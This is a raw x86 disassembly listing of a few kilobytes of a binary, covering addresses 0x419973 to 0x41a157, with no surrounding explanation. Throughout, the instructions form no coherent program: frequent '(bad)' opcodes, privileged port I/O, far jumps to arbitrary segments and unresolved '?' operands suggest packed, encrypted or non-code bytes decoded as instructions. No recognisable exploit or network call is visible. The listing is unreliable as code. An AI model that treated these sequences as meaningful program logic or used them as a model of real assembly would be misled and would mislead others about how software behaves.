  419973:	fdiv   st,st(4)
  419975:	ds retf 
  419977:	fstp   TBYTE PTR [edi+0x4b]
  41997a:	repz sbb BYTE PTR [esi],ch
  41997d:	jle    0x41997a
  41997f:	(bad)  
  419980:	sti    
  419981:	(bad)  
  419982:	and    ebx,ebx
  419984:	xchg   ebx,eax
  419985:	call   0xb506:0x1d8d6a66
  41998c:	cmc    
  41998d:	retf   0x97e6
  419990:	sbb    DWORD PTR [ebp-0x43],esi
  419993:	mov    ds:0x684fa9c0,al
  419998:	pop    ss
  419999:	cdq    
  41999a:	shl    edx,0x70
  41999d:	into   
  41999e:	or     edx,0x3e0b3f89
  4199a4:	outs   dx,BYTE PTR ds:[esi]
  4199a5:	inc    esi
  4199a6:	mov    DWORD PTR [ebx],edi
  4199a8:	jno    0x419987
  4199aa:	mov    ebp,0xe6f3fddc
  4199af:	xchg   ebp,eax
  4199b0:	popa   
  4199b1:	mov    ss,WORD PTR [eax-0x22a3935b]
  4199b7:	sar    bh,1
  4199b9:	cmp    BYTE PTR [eax-0x7],0x9
  4199bd:	xor    edi,ebp
  4199bf:	xchg   esi,eax
  4199c0:	stos   BYTE PTR es:[edi],al
  4199c1:	inc    eax
  4199c2:	fild   DWORD PTR [edx+ecx*1]
  4199c5:	cwde   
  4199c6:	add    eax,0xaf7af57a
  4199cb:	xchg   ecx,eax
  4199cc:	jmp    0x419a41
  4199ce:	outs   dx,DWORD PTR ds:[esi]
  4199cf:	dec    ebx
  4199d0:	aad    0x6
  4199d2:	mov    DWORD PTR [ebp+0xf840fe8],0x55adc4dc
  4199dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199dd:	fimul  DWORD PTR [ecx]
  4199df:	int    0x76
  4199e1:	(bad)  
  4199e2:	imul   ebx,DWORD PTR [ebx],0xe1d983b9
  4199e8:	pop    eax
  4199e9:	in     eax,dx
  4199ea:	cs cmc 
  4199ec:	ficom  DWORD PTR [ecx-0x68]
  4199ef:	or     esi,DWORD PTR [esi-0x40c17461]
  4199f5:	iret   
  4199f6:	pop    ds
  4199f7:	sub    eax,esi
  4199f9:	cmc    
  4199fa:	pusha  
  4199fb:	das    
  4199fc:	test   al,0xb6
  4199fe:	repnz out dx,al
  419a00:	ss out 0xcf,eax
  419a03:	repz out 0x15,al
  419a06:	pop    es
  419a07:	addr16 dec esp
  419a09:	and    BYTE PTR [eax+esi*8],cl
  419a0c:	jmp    0x5951:0x37573d65
  419a13:	inc    edx
  419a14:	in     eax,dx
  419a15:	jmp    0x4199cb
  419a17:	adc    eax,0xcc8560cf
  419a1c:	pop    es
  419a1d:	iret   
  419a1e:	and    DWORD PTR [edx+0x51f08446],0x570e812b
  419a28:	sub    ebp,ebx
  419a2a:	je     0x419a75
  419a2c:	mov    edx,0x8aa16f32
  419a31:	mov    ebp,0x4c321f28
  419a36:	jmp    0x4199dc
  419a38:	je     0x419a2f
  419a3a:	mov    bl,0xbe
  419a3c:	push   ss
  419a3d:	and    BYTE PTR [eax-0x5f5083f6],cl
  419a43:	and    DWORD PTR [edx-0x22],edi
  419a46:	cmc    
  419a47:	lea    eax,[edx+edi*1+0xbd733b3]
  419a4e:	jl     0x419a3a
  419a50:	sbb    al,0x93
  419a52:	push   0xdae164e1
  419a57:	sahf   
  419a58:	stos   BYTE PTR es:[edi],al
  419a59:	das    
  419a5a:	xor    eax,0x658f8f0b
  419a5f:	dec    esp
  419a60:	loop   0x419ab5
  419a62:	inc    eax
  419a63:	rcl    DWORD PTR [edx-0x7c620e3d],cl
  419a69:	sahf   
  419a6a:	dec    esp
  419a6b:	test   al,0xce
  419a6d:	nop
  419a6e:	cli    
  419a6f:	mov    ah,0x76
  419a71:	lods   al,BYTE PTR ds:[esi]
  419a72:	mov    dl,0x5a
  419a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a75:	push   0x5a
  419a77:	bound  eax,QWORD PTR [edi-0x492e51ab]
  419a7d:	inc    edi
  419a7e:	xor    al,0x82
  419a80:	xor    al,0x7e
  419a82:	xlat   BYTE PTR ds:[ebx]
  419a83:	dec    ecx
  419a84:	push   es
  419a85:	mov    ds:0x23be0007,eax
  419a8a:	sbb    BYTE PTR [esi],al
  419a8c:	push   ebx
  419a8d:	xor    bl,BYTE PTR [ecx]
  419a8f:	cdq    
  419a90:	out    dx,eax
  419a91:	mov    edi,0xb62149e
  419a96:	lock int 0x74
  419a99:	sbb    BYTE PTR [edi-0x3d],bl
  419a9c:	in     eax,0x8b
  419a9e:	mov    ebp,0xab2a2e47
  419aa3:	or     BYTE PTR [edx],bl
  419aa5:	xchg   esi,eax
  419aa6:	and    eax,0xbab6a8d6
  419aab:	add    DWORD PTR [edx-0x44],esi
  419aae:	repnz stos DWORD PTR es:[edi],eax
  419ab0:	pop    ss
  419ab1:	lods   al,BYTE PTR ds:[esi]
  419ab2:	mov    eax,0x223a0eb3
  419ab7:	cmp    ebp,DWORD PTR [edi+0x6613c361]
  419abd:	mov    al,0xbf
  419abf:	dec    edi
  419ac0:	aam    0x32
  419ac2:	adc    dl,dh
  419ac4:	xchg   BYTE PTR [ecx-0xf],ah
  419ac7:	rol    DWORD PTR [eax+0x75],cl
  419aca:	es cmc 
  419acc:	pop    edi
  419acd:	sub    edi,DWORD PTR [ecx+0x20991e61]
  419ad3:	mov    dl,0xd4
  419ad5:	cwde   
  419ad6:	mov    ebx,0xa6d2e344
  419adb:	jbe    0x419ae3
  419add:	lods   al,BYTE PTR ds:[esi]
  419ade:	test   DWORD PTR [ecx-0x335ab6f],esi
  419ae4:	jecxz  0x419abf
  419ae6:	fadd   QWORD PTR [ebp-0x8]
  419ae9:	xor    ch,bl
  419aeb:	xchg   dh,ah
  419aed:	and    bh,BYTE PTR [ebx-0x54]
  419af0:	test   BYTE PTR [edx],bl
  419af2:	sbb    al,0x7e
  419af4:	jno    0x419acf
  419af6:	pop    ebx
  419af7:	sar    DWORD PTR ds:0x3232,0x7a
  419afd:	sub    DWORD PTR [edi+0x7],ecx
  419b00:	add    eax,0xf9775124
  419b05:	lahf   
  419b06:	ja     0x419b60
  419b08:	mov    dl,0x73
  419b0a:	and    bh,bl
  419b0c:	(bad)  
  419b0d:	mov    al,0x4d
  419b0f:	outs   dx,BYTE PTR ds:[esi]
  419b10:	mov    bh,0x7e
  419b12:	xchg   esp,eax
  419b13:	mov    cs,WORD PTR [ecx+0x2c]
  419b16:	mov    ?,WORD PTR [ecx-0x41]
  419b19:	jecxz  0x419ae7
  419b1b:	cmovbe edx,ebp
  419b1e:	xchg   edi,eax
  419b1f:	adc    cl,ah
  419b21:	mov    bh,0xf5
  419b23:	adc    ebp,ebp
  419b25:	psubusb mm7,QWORD PTR [eax+0x65]
  419b29:	mov    dl,0x2c
  419b2b:	jge    0x419b08
  419b2d:	cli    
  419b2e:	outs   dx,DWORD PTR ds:[esi]
  419b2f:	jo     0x419ae0
  419b31:	jbe    0x419b52
  419b33:	cmp    esp,DWORD PTR [edx+0x3687ea06]
  419b39:	scas   eax,DWORD PTR es:[edi]
  419b3a:	pushf  
  419b3b:	or     BYTE PTR [ecx+ebp*1],dh
  419b3e:	push   es
  419b3f:	and    edi,DWORD PTR [esi+0x4d07f7ed]
  419b45:	call   0x7374:0x374acf98
  419b4c:	sub    ebx,esi
  419b4e:	retf   0xba02
  419b51:	test   DWORD PTR [edx+0x74],0xf5ff3aca
  419b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b59:	push   cs
  419b5a:	mov    edx,0xc477f8f
  419b5f:	mov    gs,WORD PTR [esi+0x3c]
  419b62:	sbb    DWORD PTR [ecx-0x1f],eax
  419b65:	xor    BYTE PTR [ebx],0x5f
  419b68:	pop    edx
  419b69:	fadd   st,st(1)
  419b6b:	sti    
  419b6c:	sub    al,0x57
  419b6e:	fwait
  419b6f:	loop   0x419b77
  419b71:	mov    eax,ds:0x5e83a9
  419b76:	xchg   BYTE PTR [edi-0x40],al
  419b79:	dec    dl
  419b7b:	sub    eax,0xb6557571
  419b80:	fdiv   DWORD PTR [edx-0x54]
  419b83:	push   es
  419b84:	sub    ebp,ebp
  419b86:	jge    0x419b4c
  419b88:	cli    
  419b89:	shr    DWORD PTR [ebx-0x18de0aad],cl
  419b8f:	cmp    bh,cl
  419b91:	mov    eax,0xc17d0366
  419b96:	push   esp
  419b97:	stos   BYTE PTR es:[edi],al
  419b98:	xchg   ebx,eax
  419b99:	dec    eax
  419b9a:	dec    ecx
  419b9b:	push   0xb299fdab
  419ba0:	mov    DWORD PTR [esi+ecx*4+0x76c91673],edx
  419ba7:	daa    
  419ba8:	jae    0x419c10
  419baa:	inc    ecx
  419bab:	repz and eax,DWORD PTR [eax]
  419bae:	push   0x55
  419bb0:	push   ecx
  419bb1:	cmp    al,0x2e
  419bb3:	pop    es
  419bb4:	fwait
  419bb5:	push   esp
  419bb6:	dec    ebx
  419bb7:	cmp    al,BYTE PTR [edx+esi*8-0x54]
  419bbb:	sbb    DWORD PTR [esi+0x791c5396],ebp
  419bc1:	data16 mov fs,WORD PTR [ecx+ebp*8-0x73178644]
  419bc9:	pushf  
  419bca:	loop   0x419b93
  419bcc:	sbb    ah,BYTE PTR [ecx]
  419bce:	pop    ecx
  419bcf:	gs out 0xb9,al
  419bd2:	add    DWORD PTR [edi+eiz*8],0x65
  419bd6:	push   ecx
  419bd7:	sbb    DWORD PTR [edx-0x1e],eax
  419bda:	cmc    
  419bdb:	jne    0x419bb7
  419bdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bde:	jns    0x419b9b
  419be0:	sub    al,0x36
  419be2:	inc    eax
  419be3:	mov    ebp,DWORD PTR [edx+0x7afd317]
  419be9:	sbb    dh,BYTE PTR [ecx+0x12]
  419bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bed:	mul    BYTE PTR [edi]
  419bef:	mov    ecx,0xf3c76bd
  419bf4:	mov    WORD PTR [ebx-0x6b],?
  419bf7:	fidiv  DWORD PTR [edi+0x528f0400]
  419bfd:	xchg   edi,eax
  419bfe:	push   ss
  419bff:	nop
  419c00:	ds inc edx
  419c02:	dec    ecx
  419c03:	(bad)  
  419c04:	int    0x6f
  419c06:	loop   0x419bd2
  419c08:	gs and eax,0xdb548916
  419c0e:	cmp    BYTE PTR [eax+0x1656538c],ch
  419c14:	imul   edi,DWORD PTR [ecx+0x35],0xe3f6c041
  419c1b:	hlt    
  419c1c:	rcl    DWORD PTR cs:[ebx-0x16ee6966],1
  419c23:	stos   DWORD PTR es:[edi],eax
  419c24:	mov    ebx,DWORD PTR [eax+esi*8-0x75f66e58]
  419c2b:	call   0x284374e2
  419c30:	popa   
  419c31:	cmp    DWORD PTR [eax+0x6ea74585],0x2
  419c38:	imul   edi,DWORD PTR ds:0x49045e0,0x8fe71eba
  419c42:	in     eax,dx
  419c43:	call   0xd0cf:0xcf5117f0
  419c4a:	ja     0x419cbf
  419c4c:	push   cs
  419c4d:	imul   ebx,DWORD PTR [eax+0x4f],0xfffffffc
  419c51:	rcr    ebp,0xcd
  419c54:	stos   BYTE PTR es:[edi],al
  419c55:	dec    esp
  419c56:	scas   al,BYTE PTR es:[edi]
  419c57:	xor    DWORD PTR [ecx],ecx
  419c59:	fisttp DWORD PTR [edi-0xaa4f0cd]
  419c5f:	sub    bl,BYTE PTR [esi+0xd]
  419c62:	xor    BYTE PTR [ecx+0x63],ch
  419c65:	stc    
  419c66:	sub    eax,0x27bf10d2
  419c6b:	sahf   
  419c6c:	fadd   QWORD PTR [ebx-0x1a7b2da6]
  419c72:	(bad)  
  419c73:	mov    ecx,0x42cb4f56
  419c78:	push   es
  419c79:	push   edi
  419c7a:	xor    eax,0x8d7dbb9c
  419c7f:	adc    al,0xe7
  419c81:	pop    edx
  419c82:	mov    bl,0xb6
  419c84:	pop    edi
  419c85:	cmp    dh,BYTE PTR [ecx-0x61a5429b]
  419c8b:	mov    edi,0x1b3e12f7
  419c90:	xchg   edx,eax
  419c91:	outs   dx,BYTE PTR ds:[esi]
  419c92:	scas   eax,DWORD PTR es:[edi]
  419c93:	add    DWORD PTR [esi+0x57],ecx
  419c96:	push   ss
  419c97:	jge    0x419ccc
  419c99:	jno    0x419ca9
  419c9b:	mov    ds:0x966864ef,eax
  419ca0:	inc    edi
  419ca1:	pop    ss
  419ca2:	cmp    esi,eax
  419ca4:	aas    
  419ca5:	daa    
  419ca6:	xchg   ebp,eax
  419ca7:	addr16 dec edi
  419ca9:	sbb    edx,DWORD PTR [edi+0x601ed975]
  419caf:	xlat   BYTE PTR ds:[ebx]
  419cb0:	mov    ecx,DWORD PTR [ebp-0x68b3f981]
  419cb6:	adc    al,0xf2
  419cb8:	lds    ecx,FWORD PTR [ecx-0x2e]
  419cbb:	adc    al,0xd8
  419cbd:	fnsave [eax+eax*1]
  419cc0:	mov    ch,0x26
  419cc2:	test   DWORD PTR ds:0xc9835941,edx
  419cc8:	dec    esp
  419cc9:	pop    esp
  419cca:	jp     0x419d25
  419ccc:	mov    eax,ds:0xadee6ba8
  419cd1:	push   0xffffffa5
  419cd3:	adc    al,BYTE PTR [eax]
  419cd5:	dec    eax
  419cd6:	loope  0x419d52
  419cd8:	rcl    dl,0x21
  419cdb:	jle    0x419d4f
  419cdd:	mov    al,ds:0x4eb3754
  419ce2:	lods   al,BYTE PTR ds:[esi]
  419ce3:	xchg   edi,eax
  419ce4:	cmp    eax,0x4ae4b144
  419ce9:	and    BYTE PTR es:[edx-0x333f2a66],ch
  419cf0:	addr16 fwait
  419cf2:	jg     0x419d02
  419cf4:	add    ecx,eax
  419cf6:	push   edx
  419cf7:	aad    0x69
  419cf9:	sub    DWORD PTR [edi+edi*2+0x19b226d8],edi
  419d00:	cmp    BYTE PTR [ecx],0x2a
  419d03:	aas    
  419d04:	push   0x1dcdca35
  419d09:	sbb    ebp,esp
  419d0b:	call   0xd08a:0xaf501981
  419d12:	push   edi
  419d13:	push   es
  419d14:	icebp  
  419d15:	dec    eax
  419d16:	lock inc edi
  419d18:	dec    ebp
  419d19:	enter  0x6b8b,0xf1
  419d1d:	push   0x1078fc4a
  419d22:	jmp    FWORD PTR [ebx-0x54]
  419d25:	adc    DWORD PTR ds:0xa7b6a301,eax
  419d2b:	push   0x789160b6
  419d30:	popa   
  419d31:	je     0x419cf4
  419d33:	adc    al,0x2a
  419d35:	mov    esp,0x26fdcf74
  419d3a:	js     0x419d5f
  419d3c:	jnp    0x419d96
  419d3e:	es ins BYTE PTR es:[edi],dx
  419d40:	add    al,0x9a
  419d42:	pop    es
  419d43:	sbb    al,0x73
  419d45:	mov    ebx,0x11f38d8
  419d4a:	test   al,0xd5
  419d4c:	pop    eax
  419d4d:	retf   
  419d4e:	gs jo  0x419d24
  419d51:	xlat   BYTE PTR ds:[ebx]
  419d52:	scas   al,BYTE PTR es:[edi]
  419d53:	dec    esi
  419d54:	mov    al,ds:0xb71ec467
  419d59:	stc    
  419d5a:	stos   DWORD PTR es:[edi],eax
  419d5b:	aaa    
  419d5c:	hlt    
  419d5d:	rep stos BYTE PTR es:[edi],al
  419d5f:	add    BYTE PTR [ebx],bh
  419d61:	repz or ah,BYTE PTR [ecx-0x1e]
  419d65:	pop    edx
  419d66:	fstp   DWORD PTR [ebx]
  419d68:	or     cl,bh
  419d6a:	mov    edx,0xbbded2d6
  419d6f:	pop    esp
  419d70:	mov    edi,0x3675069b
  419d75:	out    0x53,eax
  419d77:	pop    ecx
  419d78:	jb     0x419db7
  419d7a:	sti    
  419d7b:	fcomp  QWORD PTR [ebx+ecx*4-0x39]
  419d7f:	popf   
  419d80:	ror    esi,0xe4
  419d83:	dec    ecx
  419d84:	int    0x87
  419d86:	sbb    DWORD PTR [edx-0x16079e74],0xb50d13a3
  419d90:	lods   eax,DWORD PTR ds:[esi]
  419d91:	test   eax,0x6dc6f5d1
  419d97:	mov    al,BYTE PTR [edi]
  419d99:	es out 0x96,eax
  419d9c:	and    al,0x4d
  419d9e:	push   ebx
  419d9f:	adc    esi,esi
  419da1:	outs   dx,DWORD PTR ds:[esi]
  419da2:	scas   eax,DWORD PTR es:[edi]
  419da3:	stos   BYTE PTR es:[edi],al
  419da4:	cmp    al,0x20
  419da6:	push   ss
  419da7:	sub    eax,0xd754411e
  419dac:	rol    eax,1
  419dae:	and    eax,0x38b53399
  419db3:	aad    0xe5
  419db5:	pop    esp
  419db6:	fstp   st(5)
  419db8:	mov    ds:0x2e48cc06,al
  419dbd:	mov    esp,0x2ae2a684
  419dc2:	dec    esp
  419dc3:	sbb    eax,DWORD PTR [ebp+ecx*4+0x75d19d5b]
  419dca:	inc    edx
  419dcb:	iret   
  419dcc:	mov    bl,0x18
  419dce:	dec    esp
  419dcf:	inc    ecx
  419dd0:	aam    0xbf
  419dd2:	stc    
  419dd3:	sbb    BYTE PTR [ecx-0x73caaefd],al
  419dd9:	(bad)
  419dde:	pop    eax
  419ddf:	ins    DWORD PTR es:[edi],dx
  419de0:	inc    ebx
  419de1:	pushf  
  419de2:	addr16 aam 0xf4
  419de5:	scas   al,BYTE PTR es:[edi]
  419de6:	mov    al,BYTE PTR [edx+0x1b]
  419de9:	lock xor BYTE PTR [ecx+0x75],ch
  419ded:	icebp  
  419dee:	es pop ecx
  419df0:	mov    ch,0x59
  419df2:	xor    DWORD PTR [ecx+edx*1-0x5974c0fe],0x66450dba
  419dfd:	push   ss
  419dfe:	(bad)  
  419dff:	cmp    BYTE PTR [esi+0x2a],cl
  419e02:	sbb    ah,dl
  419e04:	pop    ecx
  419e05:	or     eax,0xc6746038
  419e0a:	push   esi
  419e0b:	adc    edi,edi
  419e0d:	mov    edi,0x45a8991a
  419e12:	and    esp,DWORD PTR [eax+0x6f54fe19]
  419e18:	es cli 
  419e1a:	dec    ebp
  419e1b:	fld    DWORD PTR [eax+0x5e]
  419e1e:	es test eax,0xa4bebf8f
  419e24:	adc    eax,0x4e70cc05
  419e29:	lods   al,BYTE PTR ds:[esi]
  419e2a:	inc    ebx
  419e2b:	imul   bp,WORD PTR [ebx+ebx*8],0x8237
  419e31:	imul   eax,esp,0x2d557e5
  419e37:	cmp    ebp,DWORD PTR [edx-0x10dc83b8]
  419e3d:	or     DWORD PTR [ecx],edx
  419e3f:	or     BYTE PTR [ecx-0x35c409a7],dh
  419e45:	and    eax,0x7c302ec
  419e4a:	(bad)  gs:[edx-0x3cbe4b2]
  419e51:	mov    WORD PTR ds:0x760c814b,gs
  419e57:	mov    al,ds:0x1af787df
  419e5c:	repz sahf 
  419e5e:	pop    edi
  419e5f:	adc    dl,ah
  419e61:	fcom   QWORD PTR [ecx+0x6e]
  419e64:	sub    edi,edx
  419e66:	aas    
  419e67:	dec    ebp
  419e68:	mov    ah,0x43
  419e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e6b:	je     0x419e00
  419e6d:	adc    eax,0x6a6bfa4d
  419e72:	jle    0x419e4c
  419e74:	add    DWORD PTR [ebp-0x2],ecx
  419e77:	xor    al,0xdd
  419e79:	or     BYTE PTR [ebp+0x1b],0x1b
  419e7d:	int    0x1a
  419e7f:	mov    al,0xcc
  419e81:	sbb    eax,0xa8664b01
  419e86:	pop    edx
  419e87:	cmp    ch,BYTE PTR [ebp-0x58faa5dd]
  419e8d:	(bad)  [eax]
  419e8f:	scas   eax,DWORD PTR es:[edi]
  419e90:	mov    edi,0xfdba6868
  419e95:	div    BYTE PTR [esi+0x7fa18662]
  419e9b:	pusha  
  419e9c:	dec    ebp
  419e9d:	inc    ebx
  419e9e:	les    ecx,FWORD PTR [ebp+ebp*2-0x50]
  419ea2:	daa    
  419ea3:	sbb    DWORD PTR [eax+0x4e95f9b7],ebx
  419ea9:	mov    eax,0x493b999c
  419eae:	enter  0xce56,0x32
  419eb2:	jo     0x419e81
  419eb4:	mov    bh,0x35
  419eb6:	push   0x5326f6d1
  419ebb:	sub    DWORD PTR [ebp+0x18069c6f],ebx
  419ec1:	mov    BYTE PTR [ecx],al
  419ec3:	mov    ds:0x3a206bc5,al
  419ec8:	jle    0x419eaa
  419eca:	inc    ecx
  419ecb:	cmp    eax,0xc2c1e11f
  419ed0:	or     ah,BYTE PTR es:[esi]
  419ed3:	add    DWORD PTR [ebx+0x11],ebp
  419ed6:	adc    eax,0x68a8cc63
  419edb:	xchg   ebp,eax
  419edc:	add    edx,DWORD PTR ds:0xc623c64c
  419ee2:	imul   ebx,DWORD PTR [ebx+0x11],0x20
  419ee6:	ds mov dl,0xb3
  419ee9:	push   edi
  419eea:	ins    BYTE PTR es:[edi],dx
  419eeb:	scas   al,BYTE PTR es:[edi]
  419eec:	pushf  
  419eed:	aas    
  419eee:	xor    BYTE PTR [ebp+0x6fe90072],0x7e
  419ef5:	adc    al,0x7f
  419ef7:	and    ah,ch
  419ef9:	jbe    0x419e84
  419efb:	dec    BYTE PTR [esi-0xc796040]
  419f01:	jno    0x419f2e
  419f03:	and    BYTE PTR [eax+0x5dc08f9e],ch
  419f09:	sbb    ebp,edx
  419f0b:	push   edx
  419f0c:	aaa    
  419f0d:	ss mov al,0xff
  419f10:	repnz and ecx,DWORD PTR ds:0x34695cfe
  419f17:	(bad)  
  419f18:	mov    esi,0xb6a5c30d
  419f1d:	es push 0x26ff9dde
  419f23:	pop    esp
  419f24:	test   al,0xd9
  419f26:	out    dx,eax
  419f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f28:	pop    ebp
  419f29:	mov    edx,0x5f5ad34b
  419f2e:	and    DWORD PTR [edx-0x61],edi
  419f31:	push   ebx
  419f32:	shr    DWORD PTR [edi],1
  419f34:	into   
  419f35:	data16 sahf 
  419f37:	data16 into 
  419f39:	push   esi
  419f3a:	iret   
  419f3b:	jge    0x419f88
  419f3d:	or     ebp,ebx
  419f3f:	or     cl,dh
  419f41:	rdmsr  
  419f43:	adc    ebx,edi
  419f45:	pop    eax
  419f46:	mov    bh,0x76
  419f48:	or     edi,esp
  419f4a:	push   esi
  419f4b:	jb     0x419fa0
  419f4d:	out    dx,eax
  419f4e:	mov    ah,dh
  419f50:	jnp    0x419f1a
  419f52:	xlat   BYTE PTR ds:[ebx]
  419f53:	fisubr DWORD PTR [esi-0x43355349]
  419f59:	rcl    DWORD PTR [edx+0x42a68a1],1
  419f5f:	(bad)
  419f62:	in     eax,0x48
  419f64:	jb     0x419f85
  419f66:	mov    dh,0x2e
  419f68:	jle    0x419ef2
  419f6a:	adc    cl,BYTE PTR [ebp-0x18]
  419f6d:	mov    esi,0xdb32826f
  419f72:	add    dh,al
  419f74:	push   edx
  419f75:	mov    ebp,0xd65db93
  419f7a:	shr    DWORD PTR [eax+0x37],cl
  419f7d:	jg     0x419f43
  419f7f:	repnz sbb DWORD PTR [ebx-0x7b],0x6f
  419f84:	pushf  
  419f85:	loope  0x419f43
  419f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f88:	add    al,0xcc
  419f8a:	aaa    
  419f8b:	jno    0x419fe2
  419f8d:	fs test eax,0x56289140
  419f93:	jae    0x419f74
  419f95:	rcr    ah,0x19
  419f98:	xor    al,0x54
  419f9a:	hlt    
  419f9b:	pop    es
  419f9c:	cmp    DWORD PTR [edx],ecx
  419f9e:	adc    DWORD PTR [ebx+eax*4-0x3dd89890],edi
  419fa5:	test   eax,0x6f81d319
  419faa:	addr16 fs out 0xc0,al
  419fae:	xor    esi,esi
  419fb0:	fldenv [ecx]
  419fb2:	repz cmp al,0xbd
  419fb5:	bound  edx,QWORD PTR [ebx-0x4]
  419fb8:	xchg   DWORD PTR [eax],eax
  419fba:	aaa    
  419fbb:	ret    
  419fbc:	sub    eax,0x5b9f92b6
  419fc1:	in     al,0xeb
  419fc3:	pop    ds
  419fc4:	loop   0x419fcf
  419fc6:	mov    edi,0xb4c0da57
  419fcb:	prefetcht2 BYTE PTR [edx]
  419fce:	push   eax
  419fcf:	enter  0x9039,0x73
  419fd3:	aas    
  419fd4:	sahf   
  419fd5:	int3   
  419fd6:	in     al,dx
  419fd7:	paddd  mm4,QWORD PTR [ebx+0x6b]
  419fdb:	add    al,0x9
  419fdd:	js     0x41a01a
  419fdf:	inc    esi
  419fe0:	(bad)  
  419fe1:	(bad)  
  419fe2:	cmc    
  419fe3:	das    
  419fe4:	or     DWORD PTR [eax-0x33],0xa7897c47
  419feb:	sub    ah,BYTE PTR [edx+eax*1-0x3c]
  419fef:	stos   DWORD PTR es:[edi],eax
  419ff0:	rcr    ebx,cl
  419ff2:	pop    eax
  419ff3:	push   cs
  419ff4:	pop    ebx
  419ff5:	jmp    0x78f5c21c
  419ffa:	rol    ch,0x13
  419ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ffe:	and    al,0xb7
  41a000:	xor    eax,0xda5c2116
  41a005:	dec    edx
  41a006:	arpl   di,dx
  41a008:	pop    ecx
  41a009:	mov    al,0xd9
  41a00b:	test   DWORD PTR [ebx],ebx
  41a00d:	inc    edx
  41a00e:	push   0xf7d2d447
  41a013:	push   edi
  41a014:	aas    
  41a015:	sub    BYTE PTR cs:[eax+0x5316867a],0x26
  41a01d:	(bad)  
  41a01f:	mov    ah,0x44
  41a021:	loopne 0x419fe2
  41a023:	retf   0x5048
  41a026:	and    DWORD PTR [eax-0x20974652],0xa740314
  41a030:	and    edx,edi
  41a032:	jle    0x41a05a
  41a034:	jg     0x419fcf
  41a036:	loope  0x41a077
  41a038:	loopne 0x41a096
  41a03a:	(bad)  
  41a03b:	xor    edx,ecx
  41a03d:	outs   dx,BYTE PTR ds:[esi]
  41a03e:	and    eax,0xc088992d
  41a043:	int3   
  41a044:	outs   dx,DWORD PTR ds:[esi]
  41a045:	outs   dx,DWORD PTR ds:[esi]
  41a046:	xlat   BYTE PTR ds:[ebx]
  41a047:	ja     0x419fd3
  41a049:	gs rcl edi,0xc8
  41a04d:	push   ebp
  41a04e:	push   edx
  41a04f:	stos   DWORD PTR es:[edi],eax
  41a050:	loope  0x419fff
  41a052:	fnstenv [edi-0x5e]
  41a055:	jo     0x41a06a
  41a057:	xor    BYTE PTR cs:[ecx-0x796d6319],dl
  41a05e:	jecxz  0x41a06b
  41a060:	in     eax,0x31
  41a062:	jne    0x419ffb
  41a064:	rcl    edx,0x29
  41a067:	ins    DWORD PTR es:[edi],dx
  41a068:	cmp    bl,BYTE PTR [edx+ebx*4+0x848b28e]
  41a06f:	enter  0x52c9,0x8e
  41a073:	aaa    
  41a074:	test   DWORD PTR [ecx],0x46cbab4a
  41a07a:	pop    esi
  41a07b:	sahf   
  41a07c:	hlt    
  41a07d:	outs   dx,BYTE PTR ds:[esi]
  41a07e:	dec    esi
  41a07f:	out    dx,al
  41a080:	push   0xffffffe3
  41a082:	test   al,0x33
  41a084:	push   ss
  41a085:	cld    
  41a086:	rcr    DWORD PTR [eax-0x1e504],1
  41a08c:	mov    dh,0x9e
  41a08e:	mov    ch,0x5e
  41a090:	in     eax,0xa7
  41a092:	test   eax,0xea487c65
  41a097:	outs   dx,BYTE PTR ds:[esi]
  41a098:	push   ss
  41a099:	lahf   
  41a09a:	sub    eax,0x707f8f2b
  41a09f:	or     eax,0x89df8035
  41a0a4:	xor    al,0xe4
  41a0a6:	xlat   BYTE PTR ds:[ebx]
  41a0a7:	mov    ebp,0x787d6b69
  41a0ac:	aas    
  41a0ad:	cwde   
  41a0ae:	fadd   st(0),st
  41a0b0:	xchg   esi,eax
  41a0b1:	mov    eax,0x664460f7
  41a0b6:	adc    cl,BYTE PTR [eax-0x6dd5e451]
  41a0bc:	sbb    edi,esi
  41a0be:	mov    ds:0xf280fa18,al
  41a0c3:	pop    esi
  41a0c4:	pop    ebp
  41a0c5:	and    cl,BYTE PTR [ebx]
  41a0c7:	call   0x77985476
  41a0cc:	adc    eax,0x4e43bd88
  41a0d1:	or     BYTE PTR [ecx+0x21],cl
  41a0d4:	dec    ebx
  41a0d5:	in     eax,dx
  41a0d6:	push   ecx
  41a0d7:	fiadd  WORD PTR [edx-0x62]
  41a0da:	dec    esi
  41a0db:	sbb    al,0x30
  41a0dd:	fs shl bh,1
  41a0e0:	bound  esi,QWORD PTR [edx-0x11]
  41a0e3:	xchg   ecx,eax
  41a0e4:	cmp    eax,0x16c35361
  41a0e9:	test   eax,0x82194a5c
  41a0ee:	xchg   esp,eax
  41a0ef:	mov    ebp,0xb5bbd34f
  41a0f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0f5:	cdq    
  41a0f6:	cmp    eax,0x5ddd410c
  41a0fb:	and    bl,BYTE PTR [edx]
  41a0fd:	sbb    eax,0x63f54d3a
  41a102:	or     BYTE PTR [esi-0x28b85969],dl
  41a108:	dec    edi
  41a109:	push   ds
  41a10a:	dec    ebp
  41a10b:	(bad)  
  41a10c:	xchg   WORD PTR [ebx+esi*2],ax
  41a110:	stc    
  41a111:	test   eax,0x48eb866e
  41a116:	jno    0x41a0f1
  41a118:	mov    edi,0xa5306b5
  41a11d:	inc    edx
  41a11e:	sbb    ebx,0xffffffe3
  41a121:	icebp  
  41a122:	jae    0x41a169
  41a124:	int3   
  41a125:	push   0x6b
  41a127:	retf   0x4a9b
  41a12a:	inc    eax
  41a12b:	pusha  
  41a12c:	daa    
  41a12d:	arpl   WORD PTR [eax+0x8b37b21],bp
  41a133:	mov    eax,0x81c4e124
  41a138:	(bad)  
  41a139:	cmp    edi,DWORD PTR [eax-0x4e]
  41a13c:	sbb    DWORD PTR [esi-0x4b],0x7428c2f3
  41a143:	push   cs
  41a144:	push   ebp
  41a145:	pop    ds
  41a146:	jmp    0x495b:0x2a9dcbd3
  41a14d:	mov    ebx,0xe876a6fc
  41a152:	rol    BYTE PTR [ecx],0xc9
  41a155:	sub    al,0x8b
  41a157:	jecxz  0x41a11a
